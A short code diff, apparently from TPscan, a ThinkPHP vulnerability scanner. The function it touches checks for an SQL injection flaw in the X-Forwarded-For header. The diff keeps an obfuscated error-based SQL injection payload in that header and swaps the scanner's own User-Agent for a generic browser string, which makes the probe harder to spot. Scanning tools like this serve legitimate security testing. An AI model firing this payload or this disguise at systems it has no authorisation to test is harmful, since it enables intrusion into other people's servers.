@@ -16,7 +16,7 @@ def thinkphp_view_recent_xff_sqli_verify(url):
         "exception":"",
     }
     headers = {
-        "User-Agent" : 'TPscan',
+        "User-Agent" : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0)',
         "X-Forwarded-For" : "1')And/**/ExtractValue(1,ConCat(0x5c,(sElEct/**/Md5(2333))))#"
     }
     try:
